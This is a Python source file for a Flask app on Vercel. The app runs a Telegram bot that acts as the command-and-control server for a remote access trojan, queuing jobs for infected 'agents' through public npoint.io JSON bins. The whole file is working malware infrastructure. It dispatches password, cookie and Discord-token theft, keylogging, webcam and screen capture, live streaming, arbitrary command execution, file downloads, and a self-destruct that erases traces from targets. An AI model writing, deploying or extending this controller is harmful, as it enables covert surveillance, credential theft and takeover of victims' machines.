# api/index.py
# Vercel-compatible controller using Flask and Webhooks.

import os
import re
import json
import uuid
import requests
from flask import Flask, request

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown

# --- Configuration ---
# TOKEN must be set as an Environment Variable in your Vercel project's settings.
TOKEN = os.getenv("TELEGRAM_TOKEN")
# These are your specific npoint URLs.
JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
STATE_URL = "https://api.npoint.io/c2be443695998be48b75"

# Initialize the Flask web server
app = Flask(__name__)

# Initialize the Telegram bot application (we don't run polling)
ptb_app = Application.builder().token(TOKEN).build()

# --- Helper Functions for State and Jobs ---

def esc(text):
    """Safely escapes text for Telegram MarkdownV2."""
    return escape_markdown(str(text), version=2)

def get_state():
    """Reads the current selected_target from the state bin."""
    try:
        res = requests.get(STATE_URL, timeout=5)
        res.raise_for_status()
        return res.json().get("selected_target", None)
    except Exception:
        return None

def set_state(target_id):
    """Writes the new selected_target to the state bin."""
    try:
        requests.post(STATE_URL, json={"selected_target": target_id}, timeout=5)
    except Exception as e:
        print(f"Error setting state: {e}")

def post_job(target_id, command, args):
    """Posts a command to the jobs bin for agents to pick up."""
    job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
    try:
        # We now post a LIST containing the new job, which replaces the bin's content.
        # This is a simple way to manage the job queue; a more robust system might append.
        # For npoint, POSTing replaces the content.
        # To simulate appending, we would need to GET, append, then POST.
        # For simplicity, we assume agents clear the queue or we can just post the latest job.
        # A better approach for multiple jobs:
        try:
            current_jobs = requests.get(JOBS_URL, timeout=5).json()
            if not isinstance(current_jobs, list):
                current_jobs = []
        except:
            current_jobs = []
        
        current_jobs.append(job)
        requests.post(JOBS_URL, json=current_jobs, timeout=5)
        return True
    except Exception as e:
        print(f"Error posting job: {e}")
        return False

# --- Telegram Command Handlers ---

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Displays the help menu."""
    help_text = (
        "__**Vercel Controller Help**__\n\n"
        "This bot runs on Vercel and uses webhooks\\. It posts jobs for remote agents\\.\n\n"
        "__🎯 **Core Controls**__\n"
        "`/target <id|all|clear>` \\- Select which agent\\(s\\) to command\\.\n"
        "`/help` \\- Shows this help message\\.\n\n"
        "__💣 **Destructive Commands**__\n"
        "`/destroy <id> CONFIRM` \\- Removes all traces of the agent from a target\\.\n\n"
        "__🕵️ **Agent Commands (Dispatched)**__\n"
        "`/info`, `/ss`, `/cam`, `/exec <cmd>`\n"
        "`/grab <passwords|cookies|discord|all>`\n"
        "`/startkeylogger`, `/stopkeylogger`\n"
        "`/livestream`, `/stoplivestream`\n"
        "`/ls`, `/cd <dir>`, `/pwd`, `/download <path>`"
    )
    await update.message.reply_text(help_text, parse_mode='MarkdownV2')

async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Sets the target agent ID by writing it to the state bin."""
    target_id = " ".join(context.args).lower() if context.args else None
    if not target_id:
        current_target = get_state() or "None"
        await update.message.reply_text(f"Current target: `{esc(current_target)}`\nUsage: `/target <id|all|clear>`", parse_mode='MarkdownV2')
        return
    
    if target_id == 'clear':
        set_state(None)
        await update.message.reply_text("✅ Target cleared.")
    else:
        set_state(target_id)
        await update.message.reply_text(f"✅ Target set to: `{esc(target_id)}`")

async def cmd_destroy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dispatches the self-destruct command with confirmation."""
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/destroy <target_id> CONFIRM`", parse_mode='MarkdownV2')
        return

    target_id = context.args[0]
    confirmation = context.args[1] if len(context.args) > 1 else ""

    if confirmation.upper() != "CONFIRM":
        reply_text = (
            f"⚠️ **ARE YOU SURE?** ⚠️\n\n"
            f"This will permanently remove the agent and all its traces from the target `{esc(target_id)}`\\. "
            f"This action cannot be undone\\.\n\n"
            f"To proceed, type the full command:\n`/destroy {esc(target_id)} CONFIRM`"
        )
        await update.message.reply_text(reply_text, parse_mode='MarkdownV2')
        return

    if post_job(target_id, "destroy", ""):
        await update.message.reply_text(f"✅ Self\\-destruct job dispatched to target `{esc(target_id)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch self\\-destruct job.")


async def generic_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles all other commands by posting them as jobs."""
    selected_target = get_state()
    if not selected_target:
        await update.message.reply_text("❌ No target selected\\. Use `/target` first\\.", parse_mode='MarkdownV2')
        return

    command = update.message.text.split(' ')[0][1:]
    args = " ".join(context.args)
    
    if post_job(selected_target, command, args):
        await update.message.reply_text(f"✅ Job `{esc(command)}` dispatched to target `{esc(selected_target)}`\\.", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text("❌ Error: Failed to dispatch job.")

# --- Register handlers with the python-telegram-bot application ---
ptb_app.add_handler(CommandHandler("help", cmd_help))
ptb_app.add_handler(CommandHandler("target", cmd_target))
ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))

# List of commands to be handled by the generic dispatcher
agent_commands = [
    "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
    "livestream", "stoplivestream", "livecam", "stoplivecam", 
    "ls", "cd", "pwd", "download"
]
for cmd in agent_commands:
    ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))

# --- Main Webhook Endpoint ---
@app.route('/', methods=['POST'])
async def process_webhook():
    update_data = request.get_json(force=True)
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    return 'OK', 200

@app.route('/', methods=['GET'])
def health_check():
    # This is the health-check endpoint. Your Vercel URL will show this message.
    return "Vercel controller is running.", 200
